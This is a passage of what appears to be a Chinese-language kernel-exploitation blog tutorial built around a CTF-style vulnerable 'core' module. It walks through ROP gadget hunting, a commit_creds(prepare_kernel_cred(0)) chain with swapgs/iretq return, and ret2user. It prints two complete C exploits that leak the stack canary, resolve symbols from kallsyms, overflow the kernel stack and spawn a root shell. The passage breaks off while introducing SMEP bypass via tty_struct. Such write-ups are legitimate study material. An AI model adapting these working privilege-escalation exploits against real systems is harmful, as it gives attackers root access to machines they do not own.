<p>然后再用 <code>checksec</code> 命令来获取基地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png" alt="image-20230405180406627"></p>
<p>得到 <code>prepare_kernel_cred</code> 的偏移为 <code>0x9cce0</code>  , <code>commit_creds</code> 函数的偏移为 <code>0x9c8e0</code> </p>
<p>把这些偏移写回到上面的脚本即可，之所以要拿到 <code>vmlinux</code> 的基地址是因为后续的 <code>gadget</code> 偏移需要加上基地址才能得到 <code>gadget</code> 的真实地址。</p>
<h4 id="获取-gadget"><a href="#获取-gadget" class="headerlink" title="获取 gadget"></a>获取 <code>gadget</code></h4><p>如下方法查看 <code>gadget</code> 会比较方便</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">grep &#x27;: pop rdi ; ret&#x27; ropgadget </span><br></pre></td></tr></table></figure>

<p>或者用 <code>vscode</code> 打开 <code>ropgadget</code> 文件， <code>ctrl+f</code> 来搜索也可以</p>
<p>找到的 <code>gadget</code> 需要先减去 <code>vmlinux</code> 的基地址得到 <code>gadget</code> 的偏移</p>
<p>最后在 <code>exp</code> 中，一个 <code>gadget</code> 的真实地址应该是 <code>vmlinux_base</code> 加上其偏移</p>
<h4 id="ROP-链的布置"><a href="#ROP-链的布置" class="headerlink" title="ROP 链的布置"></a><code>ROP</code> 链的布置</h4><p>我们最后希望用 <code>ROP</code> 来执行 <code>commit_creds(prepare_kernel_cred(0))</code> ，<code>prepare_kernel_cred(0)</code> 会返回一个 <code>root</code> 权限的 <code>cred</code> 结构体指针，而 <code>commit_creds</code> 函数可以将该结构体指针作用于当前进程，接着我们返回用户态，去执行一个 <code>system(&quot;/bin/sh&quot;)</code> 便可以稳定的以 <code>root</code> 权限执行命令了。</p>
<p>正常情况下，我们需要用 <code>pop rdi ; ret</code> 这个 <code>gadget</code> 来控制 <code>prepare_kernel_cred</code> 函数的参数，我们也可以成功搜到这个 <code>gadget</code> ，但问题在于没有 <code>mov rdi,rax ; ret</code> 这个 <code>gadget</code> 来传递给 <code>commit_creds</code> 函数参数，通过搜索发现具有一个 <code>mov rdi, rax ; jmp rdx</code> 这个 <code>gadget</code> ，并且存在 <code>pop rdx ; ret</code> 来控制 <code>rdx</code> ，因此 <code>rop</code> 链的布置如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br></pre></td></tr></table></figure>



<p>此时 <code>commit_creds(prepare_kernel_cred(0))</code> 执行完毕，但需要来稳固程序，因为在内核态栈溢出后，栈中的一些数据被损坏，其中包括了用户态的状态信息，一旦损失了这些信息，重新切换到用户态时系统就会崩溃。所以我们要在攻击之前先保存一下状态信息，将其构造在内核栈中，最后返回的时候就是正常的。</p>
<p>系统权限分为内核态和用户态，分离的实现是 <code>swapgs</code> 指令，该指令将 <code>gs</code> 寄存器的值与 <code>IA32_KERNEL_GS_BASE MSR</code> 地址中的值交换。内核态常规操作（如系统调用）的入口处，执行 <code>swapgs</code> 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 <code>swapgs</code> </p>
<p><code>iretq</code> 指令用来恢复用户空间，它会从栈中弹出已经保存的 <code>RIP</code> <code>CS</code> <code>RFLAGS</code> <code>RSP</code> <code>SS</code> 恢复之前的执行环境，所以最后执行 <code>iretq</code> 指令，恢复最开始保存的寄存器值即可。</p>
<p>所以 <code>ROP</code> 链的部分为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">rop[i++] = user_ss;<span class="comment">//SS</span></span><br></pre></td></tr></table></figure>



<p>下面两张图片是 <code>iretq</code> 指令执行前后的情况，可以看到已经从内核态切换到了用户态（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png" alt="image-20230408183923247"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png" alt="image-20230408183934789"></p>
<p>因为 <code>RIP</code> 设置的是用户态中 <code>system(&quot;/bin/sh&quot;)</code> 的地址，因此开启了新的 <code>root shell</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png" alt="image-20230408184359505"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">   rop[i++]=commit_creds;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line">   </span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p><code>ret2user</code> 和上面的 <code>ROP</code> 非常相似（毕竟本质上还是 <code>ROP</code> ），给我的感觉是 <code>ret2user</code> 在控制参数方面有很大的优势，它是将执行流返回到了用户态中布置的函数上，虽然执行的函数是位于内核空间，但因为我们的权限是 <code>ring 0</code>，因此依然可以正常运行。其根本原因是因为内核空间可以访问用户空间的进程（反之则不行），以内核的权限执行用户空间的代码完成提权（前提是没有开启 <code>SMEP</code> 保护）</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] ret2user [*]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这两份 <code>EXP</code> 其实很像，只有执行 <code>commit_creds(prepare_kernel_cred(0))</code> 函数的部分不一样（如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但有意思的是，无法在此处执行用户态的函数，因为我调用了 <code>puts</code> 函数，发现内核崩溃了，我认为其原因是状态寄存器没有进行切换所导致的，因此还得再回到内核中去恢复状态寄存器的值，最终执行用户态中的 <code>system(&quot;/bin/sh&quot;)</code> </p>
<h2 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass-SMEP"></a>bypass-SMEP</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>SMEP</code> 全称 <code>Supervisor Mode Execution Protection</code> ，当 <code>CPU</code> 处于 <code>ring0</code> 模式时执行用户空间的代码会触发页错误（该防御机制会将页表中的用户空间内存页标记为不可执行），目的是为了防止 <code>ret2user</code>。在启动时， <code>-cpu</code> 选项下加入 <code>+smep</code> 启用该防御机制，在 <code>-append</code> 选项下加入 <code>nosmep</code> 禁用该机制。</p>
<p>系统会根据 <code>CR4</code> 寄存器中第二十位的值来判断 <code>SMEP</code> 保护是否开启（ <code>1</code> 为开启，<code>0</code> 为关闭 ）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png" alt="image-20230421170620883"></p>
<p>在打开 <code>/dev/ptmx</code> 设备时，会分配一个 <code>tty_struct</code> 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span 